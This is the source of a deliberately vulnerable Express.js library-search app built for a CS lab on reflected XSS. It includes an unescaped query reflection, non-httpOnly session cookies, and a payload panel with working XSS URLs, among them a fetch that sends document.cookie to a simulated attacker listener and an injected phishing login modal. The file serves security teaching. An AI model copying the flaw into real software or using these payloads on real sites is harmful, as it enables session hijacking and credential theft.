/**
 * ============================================================================
 * BookNook Library Search Portal — VULNERABLE APPLICATION (server.js)
 * ============================================================================
 * Assigned Vulnerability: #12 — Reflected Cross-Site Scripting (XSS)
 *
 * Architecture & Scenario:
 *   - Simulates a university library book search portal.
 *   - Issues an authenticated session cookie (auth_session) to simulated user "Alice".
 *   - Features a catalog search endpoint (/search?q=...) that reflects the raw
 *     user search query into the response HTML without sanitization or output encoding.
 *   - Includes an Attacker Exfiltration Listener (/attacker/listener) to
 *     demonstrate real-world exploit impact (session hijacking & credential harvesting).
 *
 * *** DELIBERATE SECURITY FLAW ***
 * In /search, `req.query.q` is concatenated directly into the HTML body and
 * input attribute without HTML escaping or context-aware sanitization.
 * ============================================================================
 */

const express = require("express");
const path = require("path");
const app = express();
const PORT = 3000;

// Serve static assets from public/
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// In-memory store for simulated attacker exfiltration logs
const attackerLogs = [];

// Sample catalog of books
const BOOKS = [
  {
    id: 1,
    title: "Harry Potter and the Sorcerer's Stone",
    author: "J.K. Rowling",
    genre: "Fantasy",
    year: 1997,
    rating: "★★★★★",
    available: true,
    cover: "🧙‍♂️",
  },
  {
    id: 2,
    title: "The Hobbit",
    author: "J.R.R. Tolkien",
    genre: "Fantasy",
    year: 1937,
    rating: "★★★★★",
    available: true,
    cover: "🗡️",
  },
  {
    id: 3,
    title: "1984",
    author: "George Orwell",
    genre: "Dystopian",
    year: 1949,
    rating: "★★★★☆",
    available: false,
    cover: "👁️",
  },
  {
    id: 4,
    title: "Dune",
    author: "Frank Herbert",
    genre: "Sci-Fi",
    year: 1965,
    rating: "★★★★★",
    available: true,
    cover: "🪐",
  },
  {
    id: 5,
    title: "The Great Gatsby",
    author: "F. Scott Fitzgerald",
    genre: "Classic",
    year: 1925,
    rating: "★★★★☆",
    available: true,
    cover: "🍸",
  },
  {
    id: 6,
    title: "A Brief History of Time",
    author: "Stephen Hawking",
    genre: "Science",
    year: 1988,
    rating: "★★★★★",
    available: true,
    cover: "🌌",
  },
  {
    id: 7,
    title: "To Kill a Mockingbird",
    author: "Harper Lee",
    genre: "Classic",
    year: 1960,
    rating: "★★★★★",
    available: false,
    cover: "⚖️",
  },
  {
    id: 8,
    title: "Clean Code",
    author: "Robert C. Martin",
    genre: "Computer Science",
    year: 2008,
    rating: "★★★★☆",
    available: true,
    cover: "💻",
  },
];

// Helper: Render the grid of book cards
function renderBookCards(books) {
  if (books.length === 0) {
    return `
      <div class="empty-results">
        <div class="empty-icon">🔍</div>
        <h3>No matching books found</h3>
        <p>Try searching for a different title, author, or genre.</p>
      </div>
    `;
  }
  return books
    .map(
      (b) => `
      <div class="book-card">
        <div class="book-cover">${b.cover}</div>
        <div class="book-info">
          <div>
            <h3 class="book-title">${b.title}</h3>
            <p class="book-author">by ${b.author} (${b.year})</p>
          </div>
          <div class="book-meta">
            <span class="book-badge">${b.genre}</span>
            <span class="book-rating">${b.rating}</span>
            <span class="book-avail">${b.available ? "● In Stock" : "○ Checked Out"}</span>
          </div>
        </div>
      </div>
    `
    )
    .join("");
}

// Master HTML page template
function renderFullPage({ queryValue, resultsHtml, resultCount, isVulnerable = true }) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BookNook Library Portal — ${isVulnerable ? "Vulnerable Mode" : "Hardened Mode"}</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>

  <!-- Top Security Banner -->
  <div class="security-banner ${isVulnerable ? "vulnerable" : "secured"}">
    <div>
      <span class="badge">${isVulnerable ? "🔴 VULNERABLE VERSION" : "🟢 HARDENED VERSION"}</span>
      <span>${isVulnerable ? "Reflected XSS Flaw Active (Unescaped Query Reflection)" : "Patched: Context-Aware Escaping & CSP Active"}</span>
      <span style="opacity:0.75; margin-left:8px;">[Port ${isVulnerable ? "3000" : "3001"}]</span>
    </div>
    <div class="session-info">
      <span>👤 Simulated Victim: <strong>Alice (Student Admin)</strong></span>
      <span class="session-badge">Cookie: auth_session=eyJhbGci...</span>
      <a href="/attacker/listener" target="_blank" class="nav-btn" style="padding: 2px 8px; font-size: 11px;">🕵️ View Attacker Listener</a>
    </div>
  </div>

  <!-- Header -->
  <header class="site-header">
    <div class="header-container">
      <a href="/" class="brand">
        <div class="brand-icon">📚</div>
        <div>
          <h1>BookNook Library</h1>
          <p>Online Catalog & Student Academic Search System</p>
        </div>
      </a>
      <nav class="nav-links">
        <a href="/" class="nav-btn">📖 Browse Catalog</a>
        <a href="/attacker/listener" class="nav-btn">🕵️ Attacker Dashboard</a>
        <button onclick="toggleLabDrawer()" class="nav-btn primary">⚡ Exploit Showcase</button>
      </nav>
    </div>
  </header>

  <!-- Main Content -->
  <main class="main-content">
    
    <!-- Hero Search Section -->
    <section class="search-hero">
      <h2>Search the Library Catalog</h2>
      <p class="subtitle">Enter keywords, book titles, or author names to search our real-time database.</p>
      
      <form action="/search" method="GET" class="search-form">
        <div class="search-input-wrapper">
          <span class="search-input-icon">🔍</span>
          <input type="text" name="q" placeholder="Try searching 'Harry Potter', 'Orwell', or 'Sci-Fi'..." value="${queryValue}">
        </div>
        <button type="submit" class="search-btn">Search Books</button>
      </form>

      <div class="quick-tags">
        <span>Popular queries:</span>
        <a href="/search?q=Harry" class="tag-link">Harry</a>
        <a href="/search?q=Sci-Fi" class="tag-link">Sci-Fi</a>
        <a href="/search?q=Classic" class="tag-link">Classic</a>
        <a href="/search?q=Tolkien" class="tag-link">Tolkien</a>
      </div>
    </section>

    <!-- Search Results / Catalog Section -->
    <section class="catalog-section">
      <div class="results-header">
        ${resultsHtml.status}
        <span class="result-count">Found ${resultCount} titles</span>
      </div>

      <div class="book-grid">
        ${resultsHtml.cards}
      </div>
    </section>

    <!-- Exploit Showcase & Attack Payload Drawer -->
    <section class="demo-lab-panel" id="lab-panel">
      <div class="lab-panel-header" onclick="toggleLabDrawer()">
        <h3><span>⚡</span> Reflected XSS Live Demonstration Toolbox & Payloads</h3>
        <span id="lab-arrow">▼ (Click to Open)</span>
      </div>
      <div class="lab-panel-body" id="lab-panel-content" style="display: none;">
        <p style="margin-bottom: 16px; font-size: 13px; color: var(--text-muted);">
          Use these pre-crafted attack URLs during your video recording to demonstrate live exploitation on this vulnerable server:
        </p>

        <div class="payload-list">
          
          <!-- Payload 1 -->
          <div class="payload-card">
            <div class="payload-title">
              <span>1. Basic Proof-of-Concept (Script Alert)</span>
              <span class="badge" style="background:#fee2e2; color:#b91c1c; font-size:11px; padding:2px 6px;">PoC</span>
            </div>
            <p class="payload-desc">Injects a simple &lt;script&gt; tag to execute arbitrary JavaScript (alert box with execution origin).</p>
            <div class="payload-code-row">
              <div class="payload-code">/search?q=&lt;script&gt;alert('Reflected XSS Executed! Origin: ' + document.domain)&lt;/script&gt;</div>
              <button class="btn-copy" onclick="copyPayload('/search?q=%3Cscript%3Ealert(\\\'Reflected%20XSS%20Executed!%20Origin:%20\\\'%20%2B%20document.domain)%3C%2Fscript%3E', this)">Copy URL</button>
              <a href="/search?q=%3Cscript%3Ealert('Reflected XSS Executed! Origin: ' + document.domain)%3C%2Fscript%3E" class="btn-launch">Launch Attack 🚀</a>
            </div>
          </div>

          <!-- Payload 2 -->
          <div class="payload-card">
            <div class="payload-title">
              <span>2. Event Handler Injection (&lt;img onerror&gt;)</span>
              <span class="badge" style="background:#fef3c7; color:#92400e; font-size:11px; padding:2px 6px;">Filter Bypass</span>
            </div>
            <p class="payload-desc">Bypasses basic &lt;script&gt; tag blacklists by leveraging inline event handlers on image elements.</p>
            <div class="payload-code-row">
              <div class="payload-code">/search?q=&lt;img src=invalid-image onerror="alert('XSS via onerror event!')"&gt;</div>
              <button class="btn-copy" onclick="copyPayload('/search?q=%3Cimg%20src=invalid-image%20onerror=%22alert(\\\'XSS%20via%20onerror%20event!\\\')%22%3E', this)">Copy URL</button>
              <a href="/search?q=%3Cimg src=invalid-image onerror=%22alert('XSS via onerror event!')%22%3E" class="btn-launch">Launch Attack 🚀</a>
            </div>
          </div>

          <!-- Payload 3 -->
          <div class="payload-card">
            <div class="payload-title">
              <span>3. Session Cookie Theft / Exfiltration</span>
              <span class="badge" style="background:#fecdd3; color:#9f1239; font-size:11px; padding:2px 6px;">High Impact</span>
            </div>
            <p class="payload-desc">Extracts victim's active session cookie (<code>document.cookie</code>) and transmits it to the attacker listener.</p>
            <div class="payload-code-row">
              <div class="payload-code">/search?q=&lt;script&gt;fetch('/attacker/collect?stolen_cookie=' + encodeURIComponent(document.cookie));alert('Session Cookie Stolen and Sent to Attacker!');&lt;/script&gt;</div>
              <button class="btn-copy" onclick="copyPayload('/search?q=%3Cscript%3Efetch(\\\'/attacker/collect?stolen_cookie=\\\'%20%2B%20encodeURIComponent(document.cookie));alert(\\\'Session%20Cookie%20Stolen%20and%20Sent%20to%20Attacker!\\\');%3C%2Fscript%3E', this)">Copy URL</button>
              <a href="/search?q=%3Cscript%3Efetch('/attacker/collect?stolen_cookie=' + encodeURIComponent(document.cookie));alert('Session Cookie Stolen and Sent to Attacker!');%3C%2Fscript%3E" class="btn-launch">Launch Attack 🚀</a>
            </div>
          </div>

          <!-- Payload 4 -->
          <div class="payload-card">
            <div class="payload-title">
              <span>4. DOM Defacement & Credential Phishing Modal</span>
              <span class="badge" style="background:#fee2e2; color:#b91c1c; font-size:11px; padding:2px 6px;">Critical Impact</span>
            </div>
            <p class="payload-desc">Injects a fraudulent login modal overlaying the page to steal user credentials directly.</p>
            <div class="payload-code-row">
              <div class="payload-code">/search?q=&lt;div class='fake-phishing-modal'&gt;&lt;div class='phishing-card'&gt;&lt;h3&gt;⚠️ Session Expired&lt;/h3&gt;...&lt;/div&gt;&lt;/div&gt;</div>
              <a href="/search?q=%3Cdiv%20class=%27fake-phishing-modal%27%3E%3Cdiv%20class=%27phishing-card%27%3E%3Ch3%3E%E2%9A%A0%EF%B8%8F%20Session%20Expired%3C%2Fh3%3E%3Cp%3EPlease%20re-enter%20your%20credentials%20to%20continue%20accessing%20BookNook.%3C%2Fp%3E%3Cform%20onsubmit=%27submitFakePhish(event)%27%3E%3Cinput%20type=%27email%27%20id=%27phish-email%27%20placeholder=%27Email%20%2F%20Student%20ID%27%20value=%27alice%40university.edu%27%20required%3E%3Cinput%20type=%27password%27%20id=%27phish-pass%27%20placeholder=%27Password%27%20required%3E%3Cbutton%20type=%27submit%27%3ELogin%20Now%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E%3C%2Fdiv%3E" class="btn-launch">Launch Attack 🚀</a>
            </div>
          </div>

        </div>
      </div>
    </section>

  </main>

  <!-- Footer -->
  <footer class="site-footer">
    <p><strong>BookNook Library Portal</strong> &mdash; Demonstration Web Application</p>
    <div class="footer-meta">
      <span>CS Lab 2 — Problem #12: Reflected Cross-Site Scripting</span>
      <span>•</span>
      <span>Vulnerable Server (Port ${PORT})</span>
    </div>
  </footer>

  <script src="/app.js"></script>
</body>
</html>`;
}

// Middleware: Set simulated victim auth session cookie
app.use((req, res, next) => {
  // Set simulated authentication cookie (non-httpOnly for exploit demo)
  res.cookie(
    "auth_session",
    "eyJhbGciOiJIUzI1NiIsInN1YiI6ImFsaWNlX3JlYWRlciIsInJvbGUiOiJTdHVkZW50X0FkbWluIn0.x8F9aB27dK091qZ",
    { httpOnly: false, path: "/" }
  );
  res.cookie("user_role", "Student_Admin", { httpOnly: false, path: "/" });
  res.cookie("library_card", "CARD-9842-ALICE", { httpOnly: false, path: "/" });
  next();
});

// Home page
app.get("/", (req, res) => {
  res.send(
    renderFullPage({
      queryValue: "",
      resultsHtml: {
        status: `<h3 class="status-message">All Catalog Books</h3>`,
        cards: renderBookCards(BOOKS),
      },
      resultCount: BOOKS.length,
      isVulnerable: true,
    })
  );
});

// Search endpoint (VULNERABLE)
app.get("/search", (req, res) => {
  // Read raw search query from URL parameter
  const rawQuery = req.query.q || "";

  // Filter books in catalog
  const filtered = rawQuery
    ? BOOKS.filter(
        (b) =>
          b.title.toLowerCase().includes(rawQuery.toLowerCase()) ||
          b.author.toLowerCase().includes(rawQuery.toLowerCase()) ||
          b.genre.toLowerCase().includes(rawQuery.toLowerCase())
      )
    : BOOKS;

  // =========================================================================
  // *** VULNERABLE LINE ***
  // The raw `rawQuery` string is concatenated directly into the HTML response
  // without any sanitization or HTML entity escaping!
  // If the query contains <script>, <img>, or HTML tags, the browser parses
  // and executes it in the victim's session context.
  // =========================================================================
  const statusHtml = rawQuery
    ? `<h3 class="status-message">Showing search results for: <em>${rawQuery}</em></h3>`
    : `<h3 class="status-message">All Catalog Books</h3>`;

  res.send(
    renderFullPage({
      queryValue: rawQuery, // Vulnerable reflection inside input tag value attribute too
      resultsHtml: {
        status: statusHtml,
        cards: renderBookCards(filtered),
      },
      resultCount: filtered.length,
      isVulnerable: true,
    })
  );
});

// Attacker Exfiltration Receiver endpoint
app.get("/attacker/collect", (req, res) => {
  const stolenCookie = req.query.stolen_cookie || "";
  const stolenCreds = req.query.credential_theft || "";
  const logEntry = {
    timestamp: new Date().toLocaleTimeString() + " (" + new Date().toISOString().split("T")[0] + ")",
    ip: req.ip || "127.0.0.1",
    cookie: stolenCookie,
    credentials: stolenCreds,
    userAgent: req.headers["user-agent"],
  };
  attackerLogs.unshift(logEntry);
  console.log("🚨 [ATTACKER LISTENER] Exfiltrated Data Captured:", logEntry);
  res.json({ status: "success", received: logEntry });
});

// Attacker Log Dashboard
app.get("/attacker/listener", (req, res) => {
  const logItemsHtml =
    attackerLogs.length === 0
      ? `<div style="color: #64748b; text-align: center; padding: 40px 0;">No exfiltrated data captured yet.<br>Launch Payload #3 (Cookie Theft) or Payload #4 (Phishing) to see intercepted victim data here!</div>`
      : attackerLogs
          .map(
            (log, idx) => `
        <div class="log-entry">
          <div class="log-timestamp">Entry #${attackerLogs.length - idx} &bull; Timestamp: ${log.timestamp} &bull; Victim IP: ${log.ip}</div>
          ${
            log.cookie
              ? `<div><strong>Captured Cookies:</strong> <span class="log-data">${log.cookie}</span></div>`
              : ""
          }
          ${
            log.credentials
              ? `<div><strong>Captured Phished Credentials:</strong> <span class="log-data">${log.credentials}</span></div>`
              : ""
          }
          <div style="font-size: 11px; color: #64748b; margin-top: 4px;">User-Agent: ${log.userAgent}</div>
        </div>
      `
          )
          .join("");

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Attacker Command & Exfiltration Listener</title>
  <link rel="stylesheet" href="/style.css">
  <meta http-equiv="refresh" content="5">
</head>
<body style="background: #020617; color: #f8fafc;">
  
  <div class="attacker-dashboard">
    <div class="attacker-card">
      <div class="attacker-header">
        <h2><span>💀</span> Attacker Command & Exfiltration Listener</h2>
        <div style="display: flex; gap: 8px;">
          <a href="/attacker/clear" class="nav-btn" style="background:#334155; color:#fff; border:none;">Clear Logs</a>
          <a href="/" class="nav-btn primary">Back to BookNook</a>
        </div>
      </div>
      
      <div style="padding: 16px 24px; background: #0f172a; border-bottom: 1px solid #1e293b; font-size: 13px; color: #94a3b8;">
        <span>📡 Listening on <code>/attacker/collect</code> for exfiltrated XSS payloads... (Auto-refreshes every 5s)</span>
      </div>

      <div class="attacker-log-list">
        ${logItemsHtml}
      </div>
    </div>
  </div>

</body>
</html>`);
});

// Clear attacker logs
app.get("/attacker/clear", (req, res) => {
  attackerLogs.length = 0;
  res.redirect("/attacker/listener");
});

app.listen(PORT, () => {
  console.log("===============================================================");
  console.log(`🚨 BookNook (VULNERABLE Reflected XSS) running on:`);
  console.log(`👉 http://127.0.0.1:${PORT}/`);
  console.log(`👉 Attacker Listener: http://127.0.0.1:${PORT}/attacker/listener`);
  console.log("===============================================================");
});
